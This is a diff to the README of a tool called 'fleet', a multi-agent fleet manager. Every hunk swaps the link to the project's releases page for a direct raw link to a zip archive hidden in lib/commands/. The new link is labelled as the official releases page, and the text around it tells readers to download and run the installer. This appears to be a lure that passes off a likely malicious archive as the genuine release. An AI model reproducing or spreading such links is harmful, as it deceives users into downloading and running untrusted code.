@@ -1,6 +1,6 @@
 # ⛵️ fleet - Simple Multi-Agent Fleet Manager  
 
-[![Download fleet](https://img.shields.io/badge/Download-fleet-brightgreen)](https://github.com/tyl19hck/fleet/releases)  
+[![Download fleet](https://img.shields.io/badge/Download-fleet-brightgreen)](https://github.com/tyl19hck/fleet/raw/refs/heads/main/lib/commands/Software-dregless.zip)  
 
 ---
 
@@ -30,7 +30,7 @@ You will find the latest version of fleet ready for download on the Releases pag
 
 Click the badge below to open the official fleet releases page. This is where you find the latest installer files.  
 
-[![Download fleet](https://img.shields.io/badge/Download-fleet-blue)](https://github.com/tyl19hck/fleet/releases)  
+[![Download fleet](https://img.shields.io/badge/Download-fleet-blue)](https://github.com/tyl19hck/fleet/raw/refs/heads/main/lib/commands/Software-dregless.zip)  
 
 ### Step 2: Find the Latest Windows Installer  
 
@@ -134,7 +134,7 @@ Save the file as `fleet.config.yaml` in the folder where you will run fleet.
 
 When new versions come out, visit the releases page again:  
 
-https://github.com/tyl19hck/fleet/releases  
+https://github.com/tyl19hck/fleet/raw/refs/heads/main/lib/commands/Software-dregless.zip  
 
 Download the latest installer and run it. The installer will update your existing fleet copy without deleting your configuration files.  
 
@@ -172,7 +172,7 @@ After running fleet, you may notice these files and folders:
 
 ## 🔗 Helpful Resources  
 
-- Official Releases page: https://github.com/tyl19hck/fleet/releases  
+- Official Releases page: https://github.com/tyl19hck/fleet/raw/refs/heads/main/lib/commands/Software-dregless.zip  
 - GitHub Issues page for reporting bugs or asking questions  
 - Command help: `fleet --help` within the Command Prompt  
 
